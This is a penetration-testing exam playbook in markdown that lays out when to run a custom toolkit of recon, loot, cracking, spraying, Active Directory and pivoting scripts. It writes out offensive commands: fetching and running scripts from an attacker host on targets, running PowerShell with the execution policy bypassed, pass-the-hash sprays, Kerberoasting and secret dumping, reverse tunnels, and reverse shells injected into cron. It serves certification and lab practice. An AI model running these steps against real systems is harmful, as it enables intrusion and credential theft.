---
tags:
  - type/methodology
  - type/toolkit
  - type/strategy
  - phase/all
---

# OffSec Toolkit Master Strategy Guide

> [!important] This Is Your engagement Playbook
> You have 13 scripts. This document tells you exactly when to fire each one, in what order, and what to do with the output. Under engagement pressure, follow this — don't improvise the sequence.

---

## Environment Setup

All Kali-side scripts write output under `$TOOLKIT_ROOT` (defaults to `~/toolkit`). Set it once:

```bash
export TOOLKIT_ROOT="$HOME/toolkit"
```

Unified credential log: `$TOOLKIT_ROOT/creds.txt` — populated automatically by adr.sh, crackr.sh, sprayr.sh.

**Before engagement day**, verify your tools are installed:
```bash
./tools_setup.sh --check    # no sudo needed, just verifies
```

**Quick reference** if you blank on syntax under pressure:
```bash
./workflow.sh              # full cheatsheet
./workflow.sh recon        # just one phase
```

---

## The 13 Scripts at a Glance

| Script | Role | Phase | Runs On |
|--------|------|-------|---------|
| `recon.sh` | Port scan + service enum + quick-wins triage | Recon | Kali |
| `webenum.sh` | Deep web enum | Recon | Kali |
| `escalatr.sh` | Privesc tooling + staging | Post-exploit | Kali |
| `lootr.sh` | Linux loot collection | Post-exploit | **Target** |
| `lootr.ps1` | Windows loot collection | Post-exploit | **Target** |
| `crackr.sh` | Hash cracking + brute force | Passwords | Kali |
| `sprayr.sh` | Credential validation/spray + re-spray | Lateral movement | Kali |
| `adr.sh` | AD enumeration + interactive kill chain | AD | Kali |
| `pivotr.sh` | Pivot setup + reference + reconnect | Pivoting | Kali |
| `servr.sh` | File server (HTTP/SMB/FTP) | File transfer | Kali |
| `evidencr.sh` | Evidence capture | Reporting | Kali |
| `tools_setup.sh` | Tool staging installer + preflight check | Setup | Kali |
| `workflow.sh` | Workflow quick-reference cheatsheet | Reference | Kali |

> [!note] All scripts run on Kali except `lootr.sh` (Linux target) and `lootr.ps1` (Windows target).

---

## engagement Day Master Sequence

### T+0 to T+5 min: Quick-wins triage (RANK targets first)

```bash
# Triage ALL targets — 5 min per target, outputs priority ranking
sudo ./recon.sh --quick-wins-only --auto IP1 IP2 IP3 AD_IP1 AD_IP2 AD_IP3

# Read the ranked priority list
cat $TOOLKIT_ROOT/recon/target_priority.txt
```

**Pick your first target:** highest score = most attack surface. Start there.

### T+5 to T+15 min: Full recon on #1 priority target

```bash
# Full recon on the easiest target while you read triage results for others
sudo ./recon.sh --auto IP1

# In a second terminal — full recon on remaining targets
sudo ./recon.sh --auto IP2 IP3 AD_IP1 AD_IP2 AD_IP3

# Check summaries as they complete
cat $TOOLKIT_ROOT/recon/*/summary.txt
cat $TOOLKIT_ROOT/recon/*/loot/quick_wins.txt
```

---

### T+15 min onward: Per-target workflow

Follow the decision flow below. Scripts are bolded at each decision point.

---

## Phase 1: Recon

### Always: `recon.sh`

**When:** First thing. Every target. No exceptions.

**What it does:** rustscan → nmap TCP/UDP → parallel service modules (HTTP, SMB, FTP, SSH, SNMP, LDAP, MySQL, Redis, DNS, SMTP, RPC). Generates `summary.txt` and `loot/quick_wins.txt`.

```bash
# Quick-wins triage first (ranks targets by attack surface)
sudo ./recon.sh --quick-wins-only --auto IP1 IP2 IP3

# Full recon (includes quick-wins if --quick-wins flag added)
sudo ./recon.sh --auto IP1 IP2 IP3
```

**Read in this order:**
1. `$TOOLKIT_ROOT/recon/target_priority.txt` — attack order (if --quick-wins used)
2. `$TOOLKIT_ROOT/recon/IP/loot/quick_wins.txt` — anon access, default creds, zone transfers, open shares
3. `$TOOLKIT_ROOT/recon/IP/summary.txt` — full picture
4. `$TOOLKIT_ROOT/recon/IP/tcp/smb/smb_quick_findings.txt` — READ/WRITE shares
5. `$TOOLKIT_ROOT/recon/IP/udp/snmp/running_processes.txt` — ★ privesc goldmine if SNMP was open

**Stuck / nothing found:** Reduce batch size (congested network) or run deep UDP:
```bash
sudo ./recon.sh --auto --batch-size 500 IP
sudo ./recon.sh --auto --udp-full IP
```

---

### If HTTP/HTTPS found: `webenum.sh`

**When:** recon found port 80, 443, 8080, 8443, or any HTTP service.

**What it does:** Deep web enum — aggressive fingerprinting, larger wordlists, tech-stack-targeted extensions, recursive fuzzing, vhost discovery, parameter fuzzing.

**Standard run first:**
```bash
# Auto-detect HTTP URLs from recon nmap output (easiest)
./webenum.sh --from-recon TARGET_IP

# Or specify URL directly
./webenum.sh --url http://TARGET_IP
```

**If domain name discovered** (redirect, certificate, HTML source):
```bash
echo "IP  target.htb" | sudo tee -a /etc/hosts
./webenum.sh --url http://TARGET_IP --vhost target.htb
# Add discovered vhosts → rerun webenum per vhost
```

**If stuck after standard run:**
```bash
./webenum.sh --url http://TARGET_IP --deep
./webenum.sh --url http://TARGET_IP --deep --vhost target.htb  # full kitchen sink
```

**Read in this order:**
1. `$TOOLKIT_ROOT/web/TARGET/artifacts/web/summary/summary.md`
2. `$TOOLKIT_ROOT/web/TARGET/artifacts/web/summary/quick_wins.txt`
3. `$TOOLKIT_ROOT/web/TARGET/artifacts/web/fingerprint/sensitive_paths.txt`
4. `$TOOLKIT_ROOT/web/TARGET/artifacts/web/vhosts/hosts_entries.txt`

> [!tip] 401/403 on `/admin` or `/console` is still a finding — flag for auth bypass. `.git` exposed = dump with git-dumper. `.env` = cleartext creds.

---

## Phase 2: Foothold → Stable Shell

This is manual. Your cheatsheets drive exploitation. Once you have a shell:

1. Catch it with **Penelope**: `penelope -p PORT -O`
2. Confirm your shell: `whoami && hostname && id`
3. Note the OS — this determines which loot script you run next

---

## Phase 3: Post-Exploitation (First 2 Minutes After Shell)

### On Linux: `lootr.sh` (runs ON the target)

**When:** The moment you have a stable shell on a Linux target.

**Transfer and run:**
```bash
# From Kali — serve it
./servr.sh http --port 8080

# On target
wget http://KALI_IP:8080/lootr.sh -O /tmp/lootr.sh
chmod +x /tmp/lootr.sh
bash /tmp/lootr.sh
```

**Quick mode when you need speed:**
```bash
./lootr.sh --quick       # skips slower process phase
./lootr.sh --phase proof # just find the flags NOW
./lootr.sh --phase creds # just pull credentials
```

**Review order after run:**
```bash
HOST=$(hostname)

cat ~/loot/$HOST/summary.txt                     # Read first: high-level findings and next steps
cat ~/loot/$HOST/system/sudo_rights.txt          # Check sudo privileges for direct privesc
cat ~/loot/$HOST/files/suid_binaries.txt         # Review SUID binaries for GTFOBins abuse
cat ~/loot/$HOST/files/cron_jobs.txt             # Look for writable cron scripts or cron exec paths

cat ~/loot/$HOST/creds/shadow_hashes.txt         # Extract hashes for offline cracking with crackr.sh
find ~/loot/$HOST/creds -maxdepth 1 -name 'key_*' 2>/dev/null   # Find private keys; try directly before cracking

cat ~/loot/$HOST/network/internal_listeners.txt  # Identify local-only services for privesc/pivoting
cat ~/loot/$HOST/network/reachable_subnets.txt   # Identify additional reachable networks

#direct SSH-key usage
chmod 600 key_file
ssh -i key_file user@target

HOST=$(hostname)
cat loot/$HOST/summary.txt                     # ★ read first
cat loot/$HOST/creds/shadow_hashes.txt         # → feed to crackr.sh
ls loot/$HOST/creds/key_*                      # SSH keys → crack with crackr.sh
cat loot/$HOST/system/sudo_rights.txt          # → GTFOBins
cat loot/$HOST/files/suid_binaries.txt         # → GTFOBins
cat loot/$HOST/files/cron_jobs.txt             # → writable? inject shell
cat loot/$HOST/network/internal_listeners.txt  # → pivot clues
cat loot/$HOST/network/reachable_subnets.txt   # → new networks?
```

---

### On Windows: `lootr.ps1` (runs ON the target)

**When:** The moment you have a stable shell on a Windows target.

**Transfer and run:**
```bash
# From Kali — SMB is fastest for Windows
./servr.sh smb --share tools

# On target (cmd.exe or PowerShell)
copy \\KALI_IP\tools\lootr.ps1 C:\Windows\Temp\
cd C:\Windows\Temp
powershell -ep bypass -File .\lootr.ps1
```

**Quick mode:**
```powershell
.\lootr.ps1 -Quick           # skips slower files/privesc phase
.\lootr.ps1 -Phase proof     # just the flags
.\lootr.ps1 -Phase creds     # creds and privileges only
```

**Review order after run:**
```powershell
$H = $env:COMPUTERNAME; $R = ".\loot\$H"
Get-Content "$R\summary.txt"                       # ★ read first
Get-Content "$R\files\always_install_elevated.txt" # instant SYSTEM if set
Get-Content "$R\files\unquoted_service_paths.txt"  # common engagement vector
Get-Content "$R\creds\privileges.txt"              # SeImpersonate? → GodPotato
Get-Content "$R\creds\autologon.txt"               # plaintext creds in registry
Get-Content "$R\creds\cmdkey.txt"                  # stored credentials
Get-Content "$R\network\internal_listeners.txt"    # pivot clues
```

> [!warning] Windows `-Quick` skips `AlwaysInstallElevated`, unquoted paths, and DLL hijack checks. If you're trying to privesc fast, don't use quick mode.

---

## Phase 4: File Serving (Supporting Role)

### `servr.sh` — Launch before any file transfer

**When:** Any time you need to move files between Kali and target.

```bash
# HTTP — most reliable, works everywhere
./servr.sh http --port 8080
./servr.sh http --dir ~/tools --port 8080

# SMB — fastest for Windows (no download command needed on target)
./servr.sh smb --share tools
# Target: copy \\KALI_IP\tools\winpeas.exe C:\Windows\Temp\

# FTP — fallback when HTTP/SMB both blocked
./servr.sh ftp --port 2121
```

**Decision:**
- Windows target → **SMB first** (`copy` directly from cmd.exe, no curl/wget needed)
- Linux target → **HTTP** (`wget` or `curl`)
- Both blocked → **FTP**

> [!tip] servr.sh prints fully resolved copy-paste commands for both Linux and Windows targets on startup. Use those — don't type URLs manually.

---

## Phase 5: Privilege Escalation

### `escalatr.sh` — Stage privesc tools from Kali

**When:** After stable shell, before or alongside running lootr — gets privesc tooling onto target fast.

```bash
# Auto-detects OS via port probe
./escalatr.sh TARGET_IP

# Or specify OS to skip detection
./escalatr.sh TARGET_IP --os linux
./escalatr.sh TARGET_IP --os windows
```

**What it does:**
- Starts HTTP server on port 8888 serving privesc tools (linpeas, winPEAS, pspy64, PowerUp, etc.)
- Generates `$TOOLKIT_ROOT/privesc/TARGET_IP/commands.txt` — copy-paste enum commands for that OS
- Parse linpeas/winPEAS output into quick-wins report

**After running tools on target, parse output:**
```bash
./escalatr.sh --parse /tmp/linpeas_output.txt
./escalatr.sh --parse /tmp/winpeas_output.txt --os windows
cat $TOOLKIT_ROOT/privesc/TARGET_IP/quick-wins.txt
```

**Privesc decision after lootr + escalatr:**

| Finding | Action |
|---------|--------|
| Shadow hashes | Feed to `crackr.sh` |
| SSH private key | `crackr -e ssh -f id_rsa -q` |
| `SeImpersonatePrivilege` | GodPotato or PrintSpoofer |
| `sudo -l` NOPASSWD binary | GTFOBins |
| SUID binary on GTFOBins | Exploit |
| Writable cron script | Inject reverse shell |
| `AlwaysInstallElevated` | `msfvenom` MSI payload |
| Unquoted service path | Drop malicious binary |

---

## Phase 6: Password Cracking

### `crackr.sh` — Crack everything immediately

**When:** Any hash surfaces anywhere — shadow file, SAM dump, AS-REP, Kerberoast, NTLMv2 capture, SSH key, archive.

**Core engagement patterns:**
```bash
# Most common — auto-detect + quick mode (covers 80-90% of OffSec hashes)
./crackr.sh -q -f hashes.txt

# Single hash from terminal
./crackr.sh -q -H '$krb5tgs$23$*...'
./crackr.sh -q -H 'aad3b435b51404ee:NTHASHHERE'

# Shadow file after lootr finds it
./crackr.sh --unshadow /tmp/passwd /tmp/shadow -q

# SSH key after lootr finds it
./crackr.sh -e ssh -f id_rsa -q

# AS-REP / Kerberoast from adr.sh
./crackr.sh -q -f ad/corp.local/hashes/asreproast.txt
./crackr.sh -q -f ad/corp.local/hashes/kerberoast.txt
```

**If quick mode fails, escalate:**
```bash
./crackr.sh -f hashes.txt -w rockyou -r best64    # rule attack
./crackr.sh --mask '?u?l?l?l?d?d?d?d' -m 1000 -f hashes.txt  # if you know the pattern
./crackr.sh --cewl http://target.htb --cewl-mutate -q -f hashes.txt  # company wordlist
```

**Show cracked:**
```bash
./crackr.sh --show -f hashes.txt
```

> [!important] Every cracked credential is auto-logged to `$TOOLKIT_ROOT/creds.txt`. After cracking, run `./sprayr.sh --from-creds` to spray all known creds against all targets in one command.

---

## Phase 7: Credential Validation & Spraying

### `sprayr.sh` — Validate every credential the moment you crack it

**When:** You crack a hash, find a plaintext password, or get an NTLM hash from a dump.

```bash
# Validate cracked password — SMB only (fastest)
./sprayr.sh -u administrator -p 'Password123!' -t 192.168.1.10 --quick

# Validate hash (Pass-the-Hash)
./sprayr.sh -u administrator -H NTHASH -t 192.168.1.10 --quick

# If Pwn3d! → check next_steps.txt for auto-generated follow-on commands

# Spray across subnet
./sprayr.sh -u administrator -H NTHASH -t 192.168.1.0/24 --quick
# Pwn3d! on multiple = reused local admin hash

# Domain spray (READ LOCKOUT POLICY FIRST)
./sprayr.sh -U ad/corp.local/users/all_users.txt -p 'Summer2024!' \
  -d corp.local -t DC_IP --safe
```

**Re-spray all known creds** (run after EVERY new credential discovery):
```bash
# Sprays every cred from creds.txt against every target from recon — one command
./sprayr.sh --from-creds
```

**After spray hits:**
1. Check `$TOOLKIT_ROOT/spray/<timestamp>/next_steps.txt` — auto-generates psexec/evil-winrm/xfreerdp commands
2. If `Pwn3d!` on SMB → use `impacket-psexec` or `impacket-wmiexec`
3. If `Pwn3d!` on WinRM → use `evil-winrm`
4. If domain LDAP hit → run `adr.sh`

> [!warning] Domain sprays can trigger lockouts. Always check `$TOOLKIT_ROOT/ad/DOMAIN/password_policy.txt` first. Use `--safe` for domain accounts (sequential + jitter).

---

## Phase 8: Active Directory

### `adr.sh` — Full AD enumeration after any valid domain credential

**When:** You have ANY valid domain credentials (assumed-breach creds provided, cracked hash validates on LDAP, or you obtain creds through exploitation).

```bash
# Interactive AD kill chain (RECOMMENDED — guided walkthrough)
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --chain

# Quick — phases 1-3 only (credentials, users, Kerberos hashes) — run first
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --quick

# Standard run (all 9 phases, non-interactive)
./adr.sh -d corp.local -u administrator -p Password1 -dc 10.10.10.5

# Hash auth (after cracking or passing hash)
./adr.sh -d corp.local -u jdoe -H :NTHASH -dc 10.10.10.5
```

**`--chain` mode walks you through the full AD kill chain interactively:**
1. Validate foothold (cred test + password policy)
2. User enum + description mining (passwords in AD comments = OffSec classic)
3. Kerberoast + AS-REP roast (collect crackable hashes)
4. Credential dump (SAM, LSA, DPAPI, browser creds — needs admin)
5. BloodHound collection (import → Shortest Path to DA)
6. Pass-the-hash spray (spray collected NTLM hashes)
7. Share + session enum (SYSVOL, GPP, logged-on users)

Each step prompts Proceed/Skip/Quit — skip what's not relevant.

**Read in this order:**
```bash
DOMAIN=corp.local
cat $TOOLKIT_ROOT/ad/$DOMAIN/summary.txt                         # ★ always first
cat $TOOLKIT_ROOT/ad/$DOMAIN/attack_commands.txt                 # auto-generated next steps
cat $TOOLKIT_ROOT/ad/$DOMAIN/users/suspicious_descriptions.txt   # creds in descriptions = free win
cat $TOOLKIT_ROOT/ad/$DOMAIN/hashes/asreproast.txt               # → crackr.sh immediately
cat $TOOLKIT_ROOT/ad/$DOMAIN/hashes/kerberoast.txt               # → crackr.sh immediately
cat $TOOLKIT_ROOT/ad/$DOMAIN/computers/old_os.txt                # legacy OS = easy target
cat $TOOLKIT_ROOT/ad/$DOMAIN/shares/sysvol_interesting.txt       # GPP creds = pre-2014 gold
cat $TOOLKIT_ROOT/ad/$DOMAIN/chain_log.txt                       # --chain session log
```

**After adr.sh, the attack chain:**
1. Crack AS-REP/Kerberoast hashes with `crackr.sh`
2. Re-spray all known creds: `./sprayr.sh --from-creds`
3. If admin hit → `impacket-secretsdump` → get all hashes
4. Spray all hashes across all machines with `sprayr.sh --from-creds`
5. Upload BloodHound zip → find path to DA

---

## Phase 9: Pivoting

### `pivotr.sh` — When you need to reach an internal network

**When:** lootr.sh or adr.sh reveals internal subnets/hosts not directly reachable from Kali, or the AD DC is only reachable through a compromised host.

**Decision:**
```
Have SSH on pivot with valid creds?
├── YES → ./pivotr.sh ssh --type dynamic --pivot-ip IP --pivot-user user
└── NO  → Can you upload a binary?
         ├── YES → ./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
         └── NO  → ./pivotr.sh chisel --type socks --start-server
```

**Ligolo (preferred — full IP routing, no proxychains):**
```bash
# Kali: setup TUN interface, start proxy, serve agent
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve

# Target: transfer and run agent (commands printed on Kali)
/tmp/agent -connect KALI_IP:11601 -ignore-cert

# In Ligolo console: session → start
# Now scan internal network normally — no proxychains needed
sudo ./recon.sh --auto 10.10.10.5  # direct scan through tunnel
```

**Listeners for reverse shells through tunnel:**
```bash
./pivotr.sh listener --port 4444 --type shell
# Prints: listener_add command for Ligolo console + penelope catch command
```

**Double pivot (second internal network):**
```bash
./pivotr.sh ligolo2 --subnet 172.16.1.0/24
```

**Tunnel died? Reconnect in one command:**
```bash
./pivotr.sh reconnect    # reads last tunnel config from state, tears down stale, re-establishes
```

**Check tunnel status:**
```bash
./pivotr.sh status       # shows TUN interfaces, routes, running processes
```

> [!tip] Once Ligolo is up, `240.0.0.1` is the pivot host's localhost. You can reach services bound to 127.0.0.1 on the pivot without any port forward.

---

## Phase 10: Evidence Capture

### `evidencr.sh` — Run at every flag, no exceptions

**When:** The moment you capture `local.txt` or `proof.txt`. Do NOT wait until end of engagement.

```bash
# Standalone machine — both flags
./evidencr.sh -t 10.10.10.5 -n victim01 --os Linux --flags both \
  --points 20 --category standalone

# AD client — with flag value from lootr output
./evidencr.sh -t 10.10.10.6 -n CLIENT01 --os Windows --flags local \
  --local-flag "abc123..." --points 10 --category AD-client

# Domain Controller
./evidencr.sh -t 10.10.10.10 -n DC01 --os Windows --flags proof \
  --proof-flag "def456..." --points 40 --category AD-DC
```

**Script prints the screenshot checklist in green — take those screenshots NOW before moving on.**

**Minimum screenshot set per machine:**
- Local flag: `cat local.txt && hostname && whoami && id` — all in same frame
- Proof flag: `cat proof.txt && hostname && whoami && id` — all in same frame
- Low-priv shell (hostname visible)
- PrivEsc vector (the command/exploit that granted elevation)
- Root/SYSTEM shell

**Review ledger at any time:**
```bash
cat $TOOLKIT_ROOT/evidence/evidence_ledger.txt
```

---

## Scenario Playbooks

### "I just landed a shell — what do I do in the next 2 minutes?"

```
1. Catch with Penelope: penelope -p PORT -O
2. Confirm: whoami && hostname && id && ip a
3. Note OS
4. Linux? → Transfer + run lootr.sh
   Windows? → Transfer + run lootr.ps1 (use servr.sh smb for fastest transfer)
5. While lootr runs → run escalatr.sh from Kali
6. Check lootr summary.txt first
7. Feed hashes to crackr.sh immediately
8. Spray any cracked cred immediately with sprayr.sh
```

### "I found a Linux box with nothing obvious"

```
1. recon.sh already ran → check quick_wins.txt for anon/default creds
2. HTTP found? → run webenum.sh standard, read summary.md
   - Found domain? → add to /etc/hosts, run webenum --vhost
   - Still nothing? → run webenum --deep
3. SMB found? → check enum4linux + smbmap output for readable shares
4. FTP found? → check for anonymous login in quick_wins.txt
5. SNMP found? → check running_processes.txt (frequently reveals service creds in args)
6. Still stuck? → check Stuck_Decision_Tree.md
```

### "I have a Windows shell with low privs — what are the fast wins?"

```
1. lootr.ps1 already ran? → check summary.txt
2. Check in this order:
   a. always_install_elevated.txt → instant SYSTEM if both keys = 1
   b. privileges.txt → SeImpersonatePrivilege → GodPotato/PrintSpoofer
   c. autologon.txt → plaintext creds in registry
   d. cmdkey.txt → runas /savecred
   e. unquoted_service_paths.txt → drop binary + restart service
   f. writable_service_binaries.txt → replace binary + restart
3. Run winPEAS (escalatr.sh serves it) + parse with escalatr.sh --parse
4. Check PowerShell history: type $env:APPDATA\...\ConsoleHost_history.txt
```

### "I have valid AD credentials — what do I do?"

```
1. Run adr.sh --chain (interactive guided walkthrough — RECOMMENDED)
   OR run adr.sh --quick first to validate + grab low-hanging fruit
2. --chain walks you through: foothold → users → kerberos → cred dump → BloodHound → PTH
   Each step: Proceed/Skip/Quit
3. After chain completes, check:
   - suspicious_descriptions.txt (creds in descriptions = immediate win)
   - Re-spray all creds: ./sprayr.sh --from-creds
4. Feed asreproast.txt + kerberoast.txt to crackr.sh
5. Upload BloodHound zip → run "Shortest Paths to DA from Owned"
6. Crack hashes → ./sprayr.sh --from-creds → if Pwn3d! → secretsdump → respray
```

### "I need to reach an internal host through a pivot"

```
1. Do you have SSH creds on the pivot?
   YES → pivotr.sh ssh --type dynamic
   NO  → Can you write to disk?
         YES → pivotr.sh ligolo --subnet SUBNET --serve (recommended)
         NO  → pivotr.sh chisel --type socks --start-server
2. Once tunnel is up → rerun recon.sh against internal IPs
3. Catching reverse shells back through Ligolo?
   → pivotr.sh listener --port PORT --type shell
   (generates listener_add command + penelope catch command)
4. Tunnel died? → pivotr.sh reconnect (re-establishes from saved config)
```

---

## Time Management Checkpoints

| Time Elapsed | If No Flags Yet | Action |
|---|---|---|
| T+1h | 0 flags | Check webenum --deep, check SNMP output, try default creds manually |
| T+2h | 0 flags | Move to a different target — don't tunnel vision |
| T+3h | < 2 flags | Prioritize AD — assumed-breach + adr.sh is the fastest 40 points |
| T+6h | < 3 flags | Run Stuck_Decision_Tree.md — this is a time problem now |
| T+18h | < 70 pts | Stop, write report for what you have, don't lose partial credit |

---

## Script Interaction Map

```
recon.sh --quick-wins-only → rank targets → attack easiest first
recon.sh → finds HTTP → webenum.sh --from-recon IP
             → finds SMB  → check quick_wins.txt, spray creds manually
             → finds any  → manual exploitation → SHELL

SHELL obtained →
  Linux:   servr.sh (transfer) → lootr.sh (on target) → escalatr.sh (Kali)
  Windows: servr.sh smb (transfer) → lootr.ps1 (on target) → escalatr.sh (Kali)

lootr / escalatr finds hashes → crackr.sh → cracked password
cracked password → sprayr.sh --from-creds → validate ALL creds vs ALL targets
sprayr.sh finds Pwn3d! → PSExec / evil-winrm / secretsdump

AD creds available → adr.sh --chain → guided kill chain walkthrough
                   → AS-REP/Kerberoast hashes → crackr.sh
                   → cred dump (SAM/LSA/DPAPI) → sprayr.sh --from-creds
                   → bloodhound zip → upload + query paths

Internal subnets found → pivotr.sh → tunnel up → recon.sh on internals
Tunnel dies → pivotr.sh reconnect → back in one command

FLAG CAPTURED → evidencr.sh IMMEDIATELY → screenshots NOW

All creds auto-logged to $TOOLKIT_ROOT/creds.txt by adr.sh, crackr.sh, sprayr.sh
```

---

## Common Mistakes Under Pressure

> [!warning] DO NOT DO THESE

1. **Running lootr BEFORE stabilizing your shell** — unstable shell = incomplete collection
2. **Forgetting to run `sprayr.sh --from-creds` after every crack** — one command re-sprays everything
3. **Running domain sprays without checking the lockout policy first** — `adr.sh --quick` first, then `cat password_policy.txt`
4. **Not running evidencr.sh immediately at each flag** — you WILL forget attack chain details after 20 hours
5. **Skipping servr.sh and manually typing HTTP URLs** — one wrong IP wastes 10 minutes
6. **Running webenum without reading summary.md** — it's all there, read it
7. **Using `--quick` on Windows lootr for privesc** — it skips `AlwaysInstallElevated`, unquoted paths, and DLL hijack checks
8. **Not adding discovered vhosts to /etc/hosts before rerunning webenum** — webenum won't enumerate a vhost it can't resolve
9. **Attacking targets in order instead of by difficulty** — use `--quick-wins-only` to rank them first
10. **Manually re-establishing tunnels after they die** — `pivotr.sh reconnect` does it in one command

---

## Related

- [[OffSec_Methodology]] — full engagement attack chain
- [[Stuck_Decision_Tree]] — when you're genuinely stuck
- [[Creds_Tracker]] — live credential tracking
- [[Active_Directory]] — manual AD techniques
- [[recon]] — recon.sh cheatsheet
- [[webenum]] — webenum.sh cheatsheet
- [[crackr]] — crackr.sh cheatsheet
- [[lootr]] — lootr.sh / lootr.ps1 cheatsheet
- [[escalatr]] — escalatr.sh cheatsheet
- [[sprayr]] — sprayr.sh cheatsheet
- [[adr]] — adr.sh cheatsheet
- [[pivotr]] — pivotr.sh cheatsheet
- [[servr]] — servr.sh cheatsheet
- [[evidencr]] — evidencr.sh cheatsheet
- [[tools_setup]] — tools_setup.sh installer/preflight
- [[workflow]] — workflow.sh quick-reference
